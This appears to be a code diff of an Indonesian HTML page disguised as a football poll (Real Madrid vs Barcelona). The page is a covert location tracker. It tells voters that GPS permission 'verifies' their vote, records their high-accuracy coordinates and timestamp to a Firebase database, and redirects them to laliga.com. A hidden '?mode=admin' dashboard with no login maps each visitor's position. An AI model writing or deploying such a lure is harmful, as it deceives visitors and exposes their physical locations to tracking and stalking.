@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Poling Terbesar Abad Ini</title>
+    <title>Poling Sepak Bola</title>
     <style>
         body { font-family: 'Arial', sans-serif; text-align: center; background: #1a1a1a; color: white; padding: 20px; }
         .card { background: #2a2a2a; padding: 30px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); display: inline-block; width: 100%; max-width: 500px; margin-top: 30px; }
@@ -11,11 +11,10 @@
         .btn { padding: 15px 20px; border: none; border-radius: 10px; cursor: pointer; font-weight: bold; width: 45%; transition: 0.3s; color: white; }
         .madrid { background: #00468c; border: 2px solid white; }
         .barca { background: #a50044; border: 2px solid #edbb00; }
-        .btn:hover { transform: scale(1.05); }
         
-        /* Gaya untuk List Admin */
+        /* Gaya List Admin */
         .admin-item { background: #fff; color: #333; padding: 15px; border-radius: 10px; margin-bottom: 15px; text-align: left; border-left: 5px solid #4285F4; }
-        .admin-item p { margin: 5px 0; font-size: 14px; }
+        .admin-item p { margin: 5px 0; font-size: 14px; color: #333; }
         .maps-link { display: inline-block; margin-top: 8px; color: #4285F4; font-weight: bold; text-decoration: none; }
     </style>
 </head>
@@ -24,7 +23,7 @@
     <div class="card">
         <div id="pilih-box">
             <h2>VOTE TIM FAVORITMU!</h2>
-            <p>TIM FAVORITMU YANG MANA?</p>
+            <p>Siapa tim jagoanmu?</p>
             <div class="btn-box">
                 <button class="btn madrid" onclick="pilih('Real Madrid')">REAL MADRID</button>
                 <button class="btn barca" onclick="pilih('Barcelona')">BARCELONA</button>
@@ -32,78 +31,84 @@
         </div>
 
         <div id="admin-view" style="display: none;">
-            <h3 style="color: white; margin-bottom: 20px;">Dashboard Admin (Total Suara)</h3>
+            <h3 style="color: white; margin-bottom: 20px;">Dashboard Hasil Voting</h3>
             <div id="data-lokasi-list">Menunggu data masuk...</div>
         </div>
     </div>
 
     <script type="module">
-        // 1. Menggunakan 'push' agar data ditambahkan ke daftar, bukan menimpa yang lama
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-app.js";
         import { getDatabase, ref, push, onValue } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-database.js";
 
+        // Konfigurasi Firebase Anda
         const firebaseConfig = {
             databaseURL: "https://project-saya-87cc0-default-rtdb.firebaseio.com/"
         };
 
         const app = initializeApp(firebaseConfig);
         const db = getDatabase(app);
-        const linkRef = ref(db, 'laporan_voter/');
+        const linkRef = ref(db, 'laporan_voter');
 
-        const isAdmin = new URLSearchParams(window.location.search).get('mode') === 'admin';
+        const urlParams = new URLSearchParams(window.location.search);
+        const isAdmin = urlParams.get('mode') === 'admin';
 
         if (isAdmin) {
             document.getElementById('pilih-box').style.display = 'none';
             document.getElementById('admin-view').style.display = 'block';
 
-            // Mendengarkan perubahan data secara real-time
             onValue(linkRef, (snapshot) => {
                 const data = snapshot.val();
                 const container = document.getElementById('data-lokasi-list');
                 
                 if (data) {
                     let htmlContent = "";
-                    // Membalik urutan agar yang terbaru muncul di paling atas
+                    // Ambil kunci dan balik urutan (terbaru di atas)
                     const keys = Object.keys(data).reverse(); 
                     
                     keys.forEach((key) => {
                         const item = data[key];
+                        // Perbaikan: Pastikan variabel item.lat dll terbaca (Gunakan backtick ` dan simbol ${})
                         htmlContent += `
                             <div class="admin-item">
-                                <p><b>Pilihan:</b> ${item.pilihan}</p>
-                                <p><b>Waktu:</b> ${item.waktu}</p>
-                                <p><b>Koordinat:</b> ${item.lat}, ${item.lon}</p>
+                                <p><b>Pilihan:</b> ${item.pilihan || 'Tidak memilih'}</p>
+                                <p><b>Waktu:</b> ${item.waktu || '-'}</p>
+                                <p><b>Lokasi:</b> ${item.lat}, ${item.lon}</p>
                                 <a href="https://www.google.com/maps?q=${item.lat},${item.lon}" target="_blank" class="maps-link">📍 Lihat di Google Maps</a>
                             </div>
                         `;
                     });
                     container.innerHTML = htmlContent;
                 } else {
-                    container.innerHTML = "<p style='color:white;'>Belum ada yang melakukan voting.</p>";
+                    container.innerHTML = "<p style='color:white;'>Belum ada data voting di database.</p>";
                 }
             });
         }
 
         window.pilih = function(namaTim) {
-            alert("Terima kasih! Izinkan lokasi untuk verifikasi pilihan Anda.");
+            alert("Terima kasih! Klik 'Allow/Izinkan' untuk verifikasi suara.");
             
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition((pos) => {
-                    // MENGGUNAKAN PUSH: Data akan bertambah (1, 2, 3... dst)
-                    push(linkRef, {
+                    const dataBaru = {
                         pilihan: namaTim,
                         lat: pos.coords.latitude,
                         lon: pos.coords.longitude,
                         waktu: new Date().toLocaleString()
-                    }).then(() => {
-                        alert("Pilihan Anda berhasil dikirim!");
+                    };
+
+                    push(linkRef, dataBaru)
+                    .then(() => {
+                        alert("Berhasil! Suara Anda terkirim.");
                         window.location.href = "https://www.laliga.com";
+                    })
+                    .catch((error) => {
+                        alert("Error Firebase: " + error.message);
                     });
                 }, (err) => {
-                    alert("Gagal: Mohon izinkan lokasi agar suara Anda sah.");
-                }, {enableHighAccuracy: true});
+                    alert("Gagal: Mohon aktifkan GPS & Izinkan Lokasi di browser.");
+                }, { enableHighAccuracy: true });
             } else {
-                alert("Browser Anda tidak mendukung GPS.");
+                alert("Browser tidak mendukung GPS.");
             }
         }
     </script>
